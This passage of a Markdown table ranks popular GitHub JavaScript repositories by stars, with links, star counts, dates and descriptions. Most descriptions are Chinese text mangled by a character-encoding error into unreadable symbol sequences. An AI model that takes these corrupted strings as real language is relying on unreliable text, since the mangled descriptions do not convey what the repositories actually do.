|96|[superman66/vue-axios-github](https://github.com/superman66/vue-axios-github)|Vue ÂÖ®ÂÆ∂Ê°∂ + axios ÂâçÁ´ØÂÆûÁé∞ÁôªÂΩïÊã¶Êà™„ÄÅÁôªÂá∫„ÄÅÊã¶Êà™Âô®Á≠âÂäüËÉΩ|2.6k|JavaScript|06/09|
|97|[mdnice/markdown-nice](https://github.com/mdnice/markdown-nice)|ÊîØÊåÅ‰∏ªÈ¢òËÆæËÆ°ÁöÑ Markdown ÁºñËæëÂô®ÔºåËÆ©ÊéíÁâàÂèò Nice|2.5k|JavaScript|10/11|
|98|[panteng/wechat-h5-boilerplate](https://github.com/panteng/wechat-h5-boilerplate)|‰∏∫ËÖæËÆØÂæÆ‰ø°‰ºòÂåñÁöÑH5Âä®ÊïàÊ®°ÊùøÔºåÂ∏ÆÂä©‰Ω†Âø´ÈÄüÊûÑÂª∫ÂÖ®Â±èÊªöÂä®ÂûãH5È°µÈù¢„ÄÇ|2.5k|JavaScript|07/06|
|99|[TalkingData/inmap](https://github.com/TalkingData/inmap)|Â§ßÊï∞ÊçÆÂú∞ÁêÜÂèØËßÜÂåñ |2.5k|JavaScript|08/07|
|100|[feelschaotic/AndroidKnowledgeSystem](https://github.com/feelschaotic/AndroidKnowledgeSystem)|The most complete Android advanced route knowledge map ‚≠êÔ∏è‰Ω†ÊÉ≥Ë¶ÅÁöÑÊúÄÂÖ® Android ËøõÈò∂Ë∑ØÁ∫øÁü•ËØÜÂõæË∞±+Âπ≤Ë¥ßËµÑÊñôÊî∂ÈõÜüöÄ |2.5k|JavaScript|10/08|
|101|[didi/mpx](https://github.com/didi/mpx)|MpxÔºå‰∏ÄÊ¨æÂÖ∑Êúâ‰ºòÁßÄÂºÄÂèë‰ΩìÈ™åÂíåÊ∑±Â∫¶ÊÄßËÉΩ‰ºòÂåñÁöÑÂ¢ûÂº∫ÂûãÂ∞èÁ®ãÂ∫èÂºÄÂèëÊ°ÜÊû∂|2.5k|JavaScript|10/29|
|102|[JAVClub/core](https://github.com/JAVClub/core)|üîû JAVClub - ËÆ©‰Ω†ÁöÑÂ§ßÂßêÂßê‰∏çÂÜçËµ∞‰∏¢|2.4k|JavaScript|09/13|
|103|[Kujiale-Mobile/Painter](https://github.com/Kujiale-Mobile/Painter)|Â∞èÁ®ãÂ∫èÁîüÊàêÂõæÁâáÂ∫ìÔºåËΩªÊùæÈÄöËøá json ÊñπÂºèÁªòÂà∂‰∏ÄÂº†ÂèØ‰ª•ÂèëÂà∞ÊúãÂèãÂúàÁöÑÂõæÁâá|2.4k|JavaScript|10/20|
|104|[renrenio/renren-fast-vue](https://github.com/renrenio/renren-fast-vue)|renren-fast-vueÂü∫‰∫évue„ÄÅelement-uiÊûÑÂª∫ÂºÄÂèëÔºåÂÆûÁé∞renren-fastÂêéÂè∞ÁÆ°ÁêÜÂâçÁ´ØÂäüËÉΩÔºåÊèê‰æõ‰∏ÄÂ•óÊõ¥‰ºòÁöÑÂâçÁ´ØËß£ÂÜ≥ÊñπÊ°à„ÄÇ|2.4k|JavaScript|10/10|
|105|[mxflutter/mxflutter](https://github.com/mxflutter/mxflutter)|Âü∫‰∫éJavaScript ÁöÑFlutterÊ°ÜÊû∂ mxflutter|2.4k|JavaScript|07/10|
|106|[wetools/wept](https://github.com/wetools/wept)|ÂæÆ‰ø°Â∞èÁ®ãÂ∫è web Á´ØÂÆûÊó∂ËøêË°åÂ∑•ÂÖ∑|2.3k|JavaScript|08/30|
|107|[meng-chuan/Unlock-netease-cloud-music](https://github.com/meng-chuan/Unlock-netease-cloud-music)|Ëß£ÈîÅÁΩëÊòì‰∫ëÈü≥‰πêÂÆ¢Êà∑Á´ØÂèòÁÅ∞Ê≠åÊõ≤|2.3k|JavaScript|10/14|
|108|[xaboy/form-create](https://github.com/xaboy/form-create)|:fire::fire::fire: Âº∫Â§ßÁöÑË°®ÂçïÁîüÊàêÂô® Form builder with dynamic rendering, data collection, validation and submission capabilities, built-in 17 common form components, support for two-way data binding, event extension, and support for building built-in components and any vue components using json.|2.3k|JavaScript|09/25|
|109|[TaleLin/lin-ui](https://github.com/TaleLin/lin-ui)|üåà ÁÆÄÊ¥Å„ÄÅÊòìÁî®„ÄÅÁÅµÊ¥ªÁöÑÂæÆ‰ø°Â∞èÁ®ãÂ∫èÁªÑ‰ª∂Â∫ì|2.3k|JavaScript|10/23|
|110|[mumuy/data_location](https://github.com/mumuy/data_location)|‰∏≠Âçé‰∫∫Ê∞ëÂÖ±ÂíåÂõΩË°åÊîøÂå∫ÂàíÊï∞ÊçÆ„ÄêÁúÅ„ÄÅÂ∏Ç„ÄÅÂå∫Âéø„ÄÅ‰π°ÈïáË°óÈÅì„Äë‰∏≠ÂõΩÁúÅÂ∏ÇÂå∫Èïá‰∏âÁ∫ßÂõõÁ∫ßËÅîÂä®Âú∞ÂùÄÊï∞ÊçÆÔºàGB/T 2260Ôºâ|2.3k|JavaScript|07/08|
|111|[hyue418/taobao-11-11](https://github.com/hyue418/taobao-11-11)|üöÄ2020Ê∑òÂÆù+‰∫¨‰∏ú+ÊîØ‰ªòÂÆùÂèåÂçÅ‰∏Ä Âèå11ÂÖ®Ê∞ëÂÖªÁå´ ÂÖ®Ê∞ëËê•‰∏öËá™Âä®ÂåñËÑöÊú¨„ÄêÂÖ®È¢ùÂ•ñÂä±ÔºåÈò≤Ê£ÄÊµã„Äë|2.2k|JavaScript|10/30|
|112|[jasondu/wxa-plugin-canvas](https://github.com/jasondu/wxa-plugin-canvas)|Â∞èÁ®ãÂ∫èÊµ∑Êä•ÁªÑ‰ª∂-ÁîüÊàêÊúãÂèãÂúàÂàÜ‰∫´Êµ∑Êä•Âπ∂ÁîüÊàêÂõæÁâá|2.2k|JavaScript|10/09|
|113|[yyhsong/iDataV](https://github.com/yyhsong/iDataV)|Â§ßÂ±èÊï∞ÊçÆÂèØËßÜÂåñ Big screen data visualization demo|2.2k|JavaScript|06/03|
|114|[nashaofu/dingtalk](https://github.com/nashaofu/dingtalk)|ÈíâÈíâÊ°åÈù¢ÁâàÔºåÂü∫‰∫éelectronÂíåÈíâÈíâÁΩëÈ°µÁâàÂºÄÂèëÔºåÊîØÊåÅWindows„ÄÅLinuxÂíåmacOS|2.2k|JavaScript|10/07|
|115|[xiangyuecn/AreaCity-JsSpider-StatsGov](https://github.com/xiangyuecn/AreaCity-JsSpider-StatsGov)|ÁúÅÂ∏ÇÂå∫Âéø‰π°Èïá‰∏âÁ∫ßÊàñÂõõÁ∫ßÂüéÂ∏ÇÊï∞ÊçÆÔºåÂ∏¶ÊãºÈü≥Ê†áÊ≥®„ÄÅÂùêÊ†á„ÄÅË°åÊîøÂå∫ÂüüËæπÁïåËåÉÂõ¥Ôºõ2020Âπ¥10Êúà24Êó•ÊúÄÊñ∞ÈááÈõÜÔºåÊèê‰æõcsvÊ†ºÂºèÊñá‰ª∂ÔºåÊîØÊåÅÂú®Á∫øËΩ¨ÊàêÂ§öÁ∫ßËÅîÂä®js‰ª£Á†Å„ÄÅÈÄöÁî®jsonÊ†ºÂºèÔºåÊèê‰æõËΩØ‰ª∂ËΩ¨Êàêshp„ÄÅgeojson„ÄÅsql„ÄÅÂØºÂÖ•Êï∞ÊçÆÂ∫ìÔºõÂ∏¶ÊµèËßàÂô®ÈáåÈù¢ËøêË°åÁöÑjsÈááÈõÜÊ∫êÁ†ÅÔºåÁªºÂêà‰∫Ü‰∏≠Âçé‰∫∫Ê∞ëÂÖ±ÂíåÂõΩÊ∞ëÊîøÈÉ®„ÄÅÂõΩÂÆ∂ÁªüËÆ°Â±Ä„ÄÅÈ´òÂæ∑Âú∞Âõæ„ÄÅËÖæËÆØÂú∞ÂõæË°åÊîøÂå∫ÂàíÊï∞ÊçÆ|2.2k|JavaScript|10/24|
|116|[qit-team/taro-yanxuan](https://github.com/qit-team/taro-yanxuan)|È¶ñ‰∏™ Taro Â§öÁ´ØÁªü‰∏ÄÂÆû‰æã - ÁΩëÊòì‰∏•ÈÄâÔºàÂ∞èÁ®ãÂ∫è + H5 + React NativeÔºâ - By Ë∂£Â∫ó FED|2.2k|JavaScript|09/07|
|117|[imfly/bitcoin-on-nodejs](https://github.com/imfly/bitcoin-on-nodejs)|„ÄäNode.jsÂå∫ÂùóÈìæÂºÄÂèë„ÄãÔºåÊ≥®ÔºöÊñ∞Áâà‰ª£Á†ÅÂ∑≤ÂºÄÊ∫êÔºÅËØ∑starÊîØÊåÅÂì¶-^-Ôºö|2.2k|JavaScript|02/02|
|118|[zhongshaofa/layuimini](https://github.com/zhongshaofa/layuimini)|ÂêéÂè∞adminÂâçÁ´ØÊ®°ÊùøÔºåÂü∫‰∫é layui ÁºñÂÜôÁöÑÊúÄÁÆÄÊ¥Å„ÄÅÊòìÁî®ÁöÑÂêéÂè∞Ê°ÜÊû∂Ê®°Êùø„ÄÇÂè™ÈúÄÊèê‰æõ‰∏Ä‰∏™Êé•Âè£Â∞±Áõ¥Êé•ÂàùÂßãÂåñÊï¥‰∏™Ê°ÜÊû∂ÔºåÊó†ÈúÄÂ§çÊùÇÊìç‰Ωú„ÄÇ|2.2k|JavaScript|10/13|
|119|[o2oa/o2oa](https://github.com/o2oa/o2oa)|ÂºÄÊ∫êOAÁ≥ªÁªü - Á†Å‰∫ëGVP JavaÂºÄÊ∫êoa ‰ºÅ‰∏öOAÂäûÂÖ¨Âπ≥Âè∞ ‰ºÅ‰∏öOA ÂçèÂêåÂäûÂÖ¨OA ÊµÅÁ®ãÂπ≥Âè∞OA O2OA OAÔºåÊîØÊåÅÂõΩ‰∫ßÈ∫íÈ∫üÊìç‰ΩúÁ≥ªÁªüÂíåÂõΩ‰∫ßÊï∞ÊçÆÂ∫ìÔºàËææÊ¢¶„ÄÅ‰∫∫Â§ßÈáë‰ªìÔºâÔºåÊîøÂä°OAÔºåÂÜõÂ∑•‰ø°ÊÅØÂåñOA|2.2k|JavaScript|10/30|
|120|[huiyan-fe/mapv](https://github.com/huiyan-fe/mapv)|a library of geography visualization-Âú∞ÁêÜ‰ø°ÊÅØÂèØËßÜÂåñÂ∫ì|2.2k|JavaScript|09/29|
|121|[wecatch/china_regions](https://github.com/wecatch/china_regions)|ÊúÄÂÖ®ÊúÄÊñ∞‰∏≠ÂõΩÁúÅÔºåÂ∏ÇÔºåÂú∞Âå∫jsonÂèäsqlÊï∞ÊçÆ|2.1k|JavaScript|07/22|
|122|[xiangyuecn/Recorder](https://github.com/xiangyuecn/Recorder)|html5 js ÂΩïÈü≥ mp3 wav ogg webm amr Ê†ºÂºèÔºåÊîØÊåÅpcÂíåAndroid„ÄÅiosÈÉ®ÂàÜÊµèËßàÂô®„ÄÅÂíåHybrid AppÔºàÊèê‰æõAndroid IOS AppÊ∫êÁ†ÅÔºâÔºåÂæÆ‰ø°‰πüÊòØÊîØÊåÅÁöÑÔºåÊèê‰æõH5ÁâàËØ≠Èü≥ÈÄöËØùËÅäÂ§©Á§∫‰æã ÂíåDTMFÁºñËß£Á†Å|2.1k|JavaScript|10/21|
|123|[yanyiwu/nodejieba](https://github.com/yanyiwu/nodejieba)|""ÁªìÂ∑¥""‰∏≠ÊñáÂàÜËØçÁöÑNode.jsÁâàÊú¨|2.0k|JavaScript|09/15|
|124|[chokcoco/jQuery-](https://github.com/chokcoco/jQuery-)|jQueryÊ∫êÁ†ÅËß£Êûê|2.0k|JavaScript|10/21|
|125|[OBKoro1/koro1FileHeader](https://github.com/OBKoro1/koro1FileHeader)|Âú®vscode‰∏≠Áî®‰∫éÁîüÊàêÊñá‰ª∂Â§¥ÈÉ®Ê≥®ÈáäÂíåÂáΩÊï∞Ê≥®ÈáäÁöÑÊèí‰ª∂ÔºåÁªèËøáÂ§öÁâàËø≠‰ª£ÂêéÔºåÊèí‰ª∂ÔºöÊîØÊåÅÊâÄÊúâ‰∏ªÊµÅËØ≠Ë®Ä,ÂäüËÉΩÂº∫Â§ßÔºåÁÅµÊ¥ªÊñπ‰æøÔºåÊñáÊ°£ÈΩêÂÖ®ÔºåÈ£üÁî®ÁÆÄÂçïÔºÅËßâÂæóÊèí‰ª∂‰∏çÈîôÁöÑËØùÔºåÁÇπÂáªÂè≥‰∏äËßíÁªô‰∏™Star‚≠êÔ∏èÂëÄ~|2.0k|JavaScript|10/27|
|126|[CarGuo/GSYGithubAPP](https://github.com/CarGuo/GSYGithubAPP)|Ë∂ÖÂÆåÊï¥ÁöÑReact NativeÈ°πÁõÆÔºåÂäüËÉΩ‰∏∞ÂØåÔºåÈÄÇÂêàÂ≠¶‰π†ÂíåÊó•Â∏∏‰ΩøÁî®„ÄÇGSYGithubAppÁ≥ªÂàóÁöÑ‰ºòÂäøÔºöÊàë‰ª¨ÁõÆÂâçÂ∑≤ÁªèÊã•ÊúâFlutter„ÄÅWeex„ÄÅReactNative„ÄÅkotlin Âõõ‰∏™ÁâàÊú¨„ÄÇ ÂäüËÉΩÈΩêÂÖ®ÔºåÈ°πÁõÆÊ°ÜÊû∂ÂÜÖÊäÄÊúØÊ∂âÂèäÈù¢ÂπøÔºåÂÆåÊàêÂ∫¶È´òÔºåÈÖçÂ•óÊñáÁ´†ÔºåÈÄÇÂêàÂÖ®Èù¢Â≠¶‰π†ÔºåÂØπÊØîÂèÇËÄÉ„ÄÇÂºÄÊ∫êGithubÂÆ¢Êà∑Á´ØAppÔºåÊõ¥Â•ΩÁöÑ‰ΩìÈ™åÔºåÊõ¥‰∏∞ÂØåÁöÑÂäüËÉΩÔºåÊó®Âú®Êõ¥Â•ΩÁöÑÊó•Â∏∏ÁÆ°ÁêÜÂíåÁª¥Êä§‰∏™‰∫∫GithubÔºåÊèê‰æõÊõ¥Â•ΩÊõ¥Êñπ‰æøÁöÑÈ©æËΩ¶‰ΩìÈ™åŒ£(Ôø£„ÄÇÔø£Ôæâ)Ôæâ„ÄÇÂêåÊ¨æWeexÁâàÊú¨ Ôºö https://github.com/CarGuo/GSYGithubAppWeex „ÄÅÂêåÊ¨æFlutterÁâàÊú¨ Ôºö https://github.com/CarGu ...|2.0k|JavaScript|09/06|
|127|[lavas-project/lavas](https://github.com/lavas-project/lavas)|Âü∫‰∫é Vue ÁöÑ PWA Ëß£ÂÜ≥ÊñπÊ°àÔºåÂ∏ÆÂä©ÂºÄÂèëËÄÖÂø´ÈÄüÊê≠Âª∫ PWA Â∫îÁî®ÔºåËß£ÂÜ≥Êé•ÂÖ• PWA ÁöÑÂêÑÁßçÈóÆÈ¢ò|2.0k|JavaScript|08/12|
|128|[staven630/vue-cli4-config](https://github.com/staven630/vue-cli4-config)|vue-cli4ÈÖçÁΩÆvue.config.jsÊåÅÁª≠Êõ¥Êñ∞|1.9k|JavaScript|09/10|
|129|[guanpengchn/awesome-books](https://github.com/guanpengchn/awesome-books)|:books: ÂºÄÂèëËÄÖÊé®ËçêÈòÖËØªÁöÑ‰π¶Á±ç|1.9k|JavaScript|03/30|
|130|[thinkcmf/thinkcmf](https://github.com/thinkcmf/thinkcmf)|ThinkCMFÊòØ‰∏ÄÊ¨æÊîØÊåÅSwooleÁöÑÂºÄÊ∫êÂÜÖÂÆπÁÆ°ÁêÜÊ°ÜÊû∂ÔºåÂü∫‰∫éThinkPHP5.1ÂºÄÂèëÔºåÂêåÊó∂ÊîØÊåÅPHP-FPMÂíåSwooleÂèåÊ®°ÂºèÔºåËÆ©WEBÂºÄÂèëÊõ¥Âø´!|1.9k|JavaScript|10/27|
|131|[jimuyouyou/node-interview-questions](https://github.com/jimuyouyou/node-interview-questions)|Node.jsÈù¢ËØïÈ¢òÔºå‰æßÈáçÂêéÁ´ØÂ∫îÁî®‰∏éÂØπNodeÊ†∏ÂøÉÁöÑÁêÜËß£|1.9k|JavaScript|06/04|
|132|[aliyun/oss-browser](https://github.com/aliyun/oss-browser)|OSS Browser Êèê‰æõÁ±ª‰ººwindowsËµÑÊ∫êÁÆ°ÁêÜÂô®ÂäüËÉΩ„ÄÇÁî®Êà∑ÂèØ‰ª•ÂæàÊñπ‰æøÁöÑÊµèËßàÊñá‰ª∂Ôºå‰∏ä‰º†‰∏ãËΩΩÊñá‰ª∂ÔºåÊîØÊåÅÊñ≠ÁÇπÁª≠‰º†Á≠â„ÄÇ|1.9k|JavaScript|10/27|
|133|[YvetteLau/Blog](https://github.com/YvetteLau/Blog)|„ÄêÂâçÁ´ØËøõÈò∂„Äë‰ºòË¥®ÂçöÊñá|1.9k|JavaScript|09/10|
|134|[hyj1991/easy-monitor](https://github.com/hyj1991/easy-monitor)|‰ºÅ‰∏öÁ∫ß Node.js Â∫îÁî®ÊÄßËÉΩÁõëÊéß‰∏éÁ∫ø‰∏äÊïÖÈöúÂÆö‰ΩçËß£ÂÜ≥ÊñπÊ°à|1.9k|JavaScript|08/28|
|135|[iamxjb/winxin-app-watch-life.net](https://github.com/iamxjb/winxin-app-watch-life.net)|ÂæÆÊÖïÂ∞èÁ®ãÂ∫èÂºÄÊ∫êÁâà-WordPressÁâàÂæÆ‰ø°Â∞èÁ®ãÂ∫è|1.9k|JavaScript|09/27|
|136|[notadd/neditor](https://github.com/notadd/neditor)|Âü∫‰∫é ueditorÁöÑÊõ¥Áé∞‰ª£ÂåñÁöÑÂØåÊñáÊú¨ÁºñËæëÂô®ÔºåÊîØÊåÅHTTPS|1.8k|JavaScript|04/30|
|137|[justjavac/ReplaceGoogleCDN](https://github.com/justjavac/ReplaceGoogleCDN)|:cancer: ‰∏Ä‰∏™ Chrome Êèí‰ª∂ÔºöÂ∞Ü Google CDN ÊõøÊç¢‰∏∫ÂõΩÂÜÖÁöÑ„ÄÇ|1.8k|JavaScript|07/15|
|138|[BetaSu/just-react](https://github.com/BetaSu/just-react)|„ÄåReactÊäÄÊúØÊè≠Áßò„Äç  ‰∏ÄÊú¨Ëá™È°∂Âêë‰∏ãÔºå‰ªéÁêÜÂøµÂà∞‰ª£Á†ÅÁöÑÊ∫êÁ†ÅÂàÜÊûê‰π¶|1.8k|JavaScript|10/28|
|139|[renrenio/renren-security](https://github.com/renrenio/renren-security)|ÈááÁî®Spring„ÄÅMyBatis„ÄÅShiroÊ°ÜÊû∂ÔºåÂºÄÂèëÁöÑ‰∏ÄÂ•óÊùÉÈôêÁ≥ªÁªüÔºåÊûÅ‰ΩéÈó®ÊßõÔºåÊãøÊù•Âç≥Áî®„ÄÇËÆæËÆ°‰πãÂàùÔºåÂ∞±ÈùûÂ∏∏Ê≥®ÈáçÂÆâÂÖ®ÊÄßÔºå‰∏∫‰ºÅ‰∏öÁ≥ªÁªü‰øùÈ©æÊä§Ëà™ÔºåËÆ©‰∏ÄÂàáÈÉΩÂèòÂæóÂ¶ÇÊ≠§ÁÆÄÂçï„ÄÇ„ÄêQQÁæ§Ôºö324780204„ÄÅ145799952„Äë|1.8k|JavaScript|10/13|
|140|[we-plugin/we-cropper](https://github.com/we-plugin/we-cropper)|ÂæÆ‰ø°Â∞èÁ®ãÂ∫èÂõæÁâáË£ÅÂâ™Â∑•ÂÖ∑|1.8k|JavaScript|06/08|
|141|[alibaba/form-render](https://github.com/alibaba/form-render)|üö¥‚Äç‚ôÄÔ∏è ÊòìÁî®ÁöÑË∑®ÁªÑ‰ª∂‰ΩìÁ≥ªÁöÑË°®ÂçïÊ∏≤ÊüìÂºïÊìé - ÈÄöËøá JSON Schema Âø´ÈÄüÁîüÊàêËá™ÂÆö‰πâË°®ÂçïÈÖçÁΩÆÁïåÈù¢ |1.8k|JavaScript|10/29|
|142|[dntzhang/cax](https://github.com/dntzhang/cax)|HTML5 Canvas 2D Rendering Engine - Â∞èÁ®ãÂ∫è„ÄÅÂ∞èÊ∏∏Êàè‰ª•Âèä Web ÈÄöÁî® Canvas Ê∏≤ÊüìÂºïÊìé|1.8k|JavaScript|06/15|
|143|[Nealyang/React-Express-Blog-Demo](https://github.com/Nealyang/React-Express-Blog-Demo)|:fire: React+Express+Mongo ->ÂâçÂêéÁ´ØÂçöÂÆ¢ÁΩëÁ´ô :new_moon_with_face:|1.8k|JavaScript|08/12|
|144|[jsfront/month](https://github.com/jsfront/month)|ÂâçÁ´ØÁü•ËØÜÊúàÂàä|1.7k|JavaScript|10/29|
|145|[luoxue-victor/workflow](https://github.com/luoxue-victor/workflow)|Êú¨È°πÁõÆÁöÑÁ¨¨ÂõõÊ¨°Èù©ÂëΩÔºå‰∏çÊ≠¢ÂâçÁ´ØÔºÅ|1.7k|JavaScript|09/05|
|146|[guanguans/notes](https://github.com/guanguans/notes)|:notebook_with_decorative_cover: Linux„ÄÅMySQL„ÄÅNginx„ÄÅPHP„ÄÅGit„ÄÅShell Á≠âÁ¨îËÆ∞|1.7k|JavaScript|09/24|
|147|[logoove/weui](https://github.com/logoove/weui)|weui+ÊòØÂú®weuiÂíåzeptoÂü∫Á°Ä‰∏äÂºÄÂèëÁöÑÂ¢ûÂº∫UIÁªÑ‰ª∂,ÁõÆÂâçÂàÜ‰∏∫Ë°®Âçï,Âü∫Á°Ä,ÁªÑ‰ª∂,jsÊèí‰ª∂ÂõõÂ§ßÁ±ª,ÂÖ±ËÆ°Áôæ‰ΩôÈ°πÂäüËÉΩ,ÊòØÊúÄÂÖ®ÁöÑweuiÊ†∑Âºè|1.7k|JavaScript|09/06|
|148|[treadpit/wx_calendar](https://github.com/treadpit/wx_calendar)|ÂæÆ‰ø°Â∞èÁ®ãÂ∫èÔºçÊó•ÂéÜÁªÑ‰ª∂ üìÖ|1.7k|JavaScript|10/28|
|149|[hua1995116/webchat](https://github.com/hua1995116/webchat)|:speaker: Websocket project based on vueÔºàÂü∫‰∫évue2.0ÁöÑÂÆûÊó∂ËÅäÂ§©È°πÁõÆÔºâ|1.7k|JavaScript|08/27|
|150|[dai-siki/vue-image-crop-upload](https://github.com/dai-siki/vue-image-crop-upload)|A beautiful vue component for image cropping and uploading. ÔºàvueÂõæÁâáÂâ™Ë£Å‰∏ä‰º†ÁªÑ‰ª∂Ôºâ|1.7k|JavaScript|10/09|
|151|[SuperMonster003/Auto.js_Projects](https://github.com/SuperMonster003/Auto.js_Projects)|Âü∫‰∫éAuto.jsÁöÑËæÖÂä©Â∑•ÂÖ∑È°πÁõÆ (ËöÇËöÅÊ£ÆÊûó)  Auto.js-based assistant tools projects (Ant Forest)|1.7k|JavaScript|10/20|
|152|[mengkunsoft/MKOnlineMusicPlayer](https://github.com/mengkunsoft/MKOnlineMusicPlayer)|‚õîÔºàÂÅúÊ≠¢Áª¥Êä§ÔºâÂ§öÊ∫êÁöÑÂú®Á∫øÈü≥‰πêÊí≠ÊîæÂô®ÔºåÂü∫‰∫é Meting |1.7k|JavaScript|08/18|
|153|[lxk0301/scripts](https://github.com/lxk0301/scripts)|‰∫¨‰∏úËñÖÁæäÊØõÂ∑•ÂÖ∑,  ‰∫¨‰∏úÊ∞¥Êûú„ÄÅÂÆ†Áâ©„ÄÅÁßçË±ÜÁ≠âÁ≠â|1.7k|JavaScript|10/30|
|154|[Wizzercn/NutzWk](https://github.com/Wizzercn/NutzWk)|WKÁ≥ªÂàóÂºÄÂèëÊ°ÜÊû∂-V1Ëá≥V5 JavaÂºÄÊ∫ê‰ºÅ‰∏öÁ∫ßÂºÄÂèëÊ°ÜÊû∂(ÂçïÂ∫îÁî®/ÂæÆÊúçÂä°/ÂàÜÂ∏ÉÂºè)|1.6k|JavaScript|10/25|
|155|[ronggang/PT-Plugin-Plus](https://github.com/ronggang/PT-Plugin-Plus)|PT Âä©Êâã PlusÔºå‰∏∫ Google Chrome Âíå Firefox ÊµèËßàÂô®Êèí‰ª∂ÔºàWeb ExtensionsÔºâÔºå‰∏ªË¶ÅÁî®‰∫éËæÖÂä©‰∏ãËΩΩ PT Á´ôÁöÑÁßçÂ≠ê„ÄÇ|1.6k|JavaScript|10/29|
|156|[kaola-fed/megalo](https://github.com/kaola-fed/megalo)|Âü∫‰∫é Vue ÁöÑÂ∞èÁ®ãÂ∫èÂºÄÂèëÊ°ÜÊû∂|1.6k|JavaScript|09/06|
|157|[lgwebdream/FE-Interview](https://github.com/lgwebdream/FE-Interview)|ÂâçÁ´ØÈù¢ËØïÂøÖÂ§áÈ¢òÂ∫ìÔºå1000+Èù¢ËØïÁúüÈ¢òÔºåHtml„ÄÅCss„ÄÅJavaScript„ÄÅVue„ÄÅReact„ÄÅNode„ÄÅTypeScript„ÄÅWebpack„ÄÅÁÆóÊ≥ï„ÄÅÁΩëÁªú‰∏éÂÆâÂÖ®„ÄÅÊµèËßàÂô®|1.6k|JavaScript|10/29|
|158|[justjavac/Flarum](https://github.com/justjavac/Flarum)|Flarum - ‰ºòÈõÖËá™Áî±ÁöÑ PHP ËΩªÁ§æÂå∫|1.6k|JavaScript|07/15|
|159|[wubaiqing/zaobao](https://github.com/wubaiqing/zaobao)|ÊØèÊó•Êó∂Êä•Ôºå‰ª•ÂâçÁ´ØÊäÄÊúØ‰ΩìÁ≥ª‰∏∫‰∏ªË¶ÅÂàÜ‰∫´ËØæÈ¢ò„ÄÇÊ†πÊçÆÔºöÊñáÁ´†„ÄÅÂ∑•ÂÖ∑„ÄÅÊñ∞Èóª„ÄÅËßÜÈ¢ëÂá†Â§ßÊùøÂùó‰Ωú‰∏∫‰∏ªË¶ÅÂàÜÁ±ª„ÄÇ|1.6k|JavaScript|10/29|
|160|[mumuy/widget](https://github.com/mumuy/widget)|A set of widgets based on jQuery&&javascript. ‰∏ÄÂ•óÂü∫‰∫éjqueryÊàñjavascriptÁöÑÊèí‰ª∂Â∫ì ÔºöËΩÆÊí≠„ÄÅÊ†áÁ≠æÈ°µ„ÄÅÊªöÂä®Êù°„ÄÅ‰∏ãÊãâÊ°Ü„ÄÅÂØπËØùÊ°Ü„ÄÅÊêúÁ¥¢ÊèêÁ§∫„ÄÅÂüéÂ∏ÇÈÄâÊã©(ÂüéÂ∏Ç‰∏âÁ∫ßËÅîÂä®)„ÄÅÊó•ÂéÜÁ≠â|1.6k|JavaScript|10/22|
|161|[fengyuanchen/distpicker](https://github.com/fengyuanchen/distpicker)|‚ö†Ô∏è [Deprecated] No longer maintained. A simple jQuery plugin for picking provinces, cities and districts of China. (‰∏≠ÂõΩ / ÁúÅÂ∏ÇÂå∫ / ‰∏âÁ∫ßËÅîÂä® / Âú∞ÂùÄÈÄâÊã©Âô®)|1.6k|JavaScript|09/30|
|162|[proYang/outils](https://github.com/proYang/outils)|:rocket: ÂâçÁ´Ø‰∏öÂä°‰ª£Á†ÅÂ∑•ÂÖ∑Â∫ì|1.5k|JavaScript|10/09|
|163|[ipcjs/bilibili-helper](https://github.com/ipcjs/bilibili-helper)|ÂêÑÁßçÊ≤πÁå¥ËÑöÊú¨|1.5k|JavaScript|10/17|
|164|[a597873885/webfunny_monitor](https://github.com/a597873885/webfunny_monitor)|ËøôÊòØ‰∏ÄÊ¨æËΩªÈáèÁ∫ßÁöÑÂâçÁ´ØÁõëÊéßÁ≥ªÁªüÔºå‰ª•ÂèäÂâçÁ´ØÊÄßËÉΩÁõëÊéßÁ≥ªÁªüÔºåÂè™ÈúÄÁÆÄÂçïÊìç‰Ωú‰æøÂèØÁßÅÊúâÂåñÈÉ®ÁΩ≤Âà∞Ëá™Â∑±ÁöÑÊúçÂä°Âô®‰∏ä„ÄÇ1.ÂÆûÁé∞Êó†ÂüãÁÇπÁõëÊéßÂâçÁ´ØÊó•ÂøóÔºåÂØπÂâçÁ´ØPV„ÄÅUVÁ≤æÂáÜÂàÜÊûêÔºõ2.ÂØπÁî®Êà∑ÁïôÂ≠òÁéáÂàÜÊûê„ÄÅÁî®Êà∑Ë∑≥Âá∫ÁéáÂàÜÊûêÔºåÁî®Êà∑Âú®È°µÈù¢ÂÅúÁïôÊó∂Èó¥ÂàÜÊûê„ÄÇ3.ÁõëÊéßJSÈîôËØØÔºåÂàÜÊûêjsÊä•ÈîôË∂ãÂäøÔºåÁî®SourceMapÂèçÂêëÂÆö‰ΩçÊ∫êÁ†Å„ÄÇ4.ÁõëÊéßÊé•Âè£ËØ∑Ê±ÇÔºåÂàÜÊûêÊé•Âè£ÁöÑÂ§±Ë¥•ÁéáÔºåÁªüËÆ°ÂàÜÊûêÊé•Âè£ÊÄßËÉΩÔºåÁªüËÆ°ÂàÜÊûêÊé•Âè£ËÄóÊó∂Á≠â„ÄÇ5.ÁõëÊéßÈùôÊÄÅËµÑÊ∫êÂä†ËΩΩÊÉÖÂÜµÔºåÁªüËÆ°ÂàÜÊûêÈùôÊÄÅËµÑÊ∫êÂä†ËΩΩÂ§±Ë¥•ÁöÑÊÉÖÂÜµÔºåÂàÜÊûêÂâçÁ´ØÁôΩÂ±è„ÄÇ6.Êà∑ÁªÜÊü•ÂäüËÉΩÔºåËÆ∞ÂΩï‰∏ãÊØè‰∏™Áî®Êà∑ÁöÑÊâÄÊúâË°å‰∏∫ÔºåÂ§çÁé∞Áîü‰∫ßÁéØÂ¢ÉBug„ÄÇËá™ÂÆö‰πâÂüãÁÇπÂäüËÉΩÔºåÂèØ‰ª•Ëá™ÂÆö‰πâÂüãÁÇπÔºåwebfunny‰ºöÂ∞ÜÂÖ∂ËÆ∞ÂΩï‰∏ãÊù•ÔºåÂπ∂ÂÆöÊó∂ÂàÜÊûê„ÄÇÂêåÊó∂ÂèØ‰ª•ÂØπÂ§ö‰∏™ÂüãÁÇπÊ≠•È™§ËøõË°åÊºèÊñóÂàÜÊûê ...|1.5k|JavaScript|10/23|
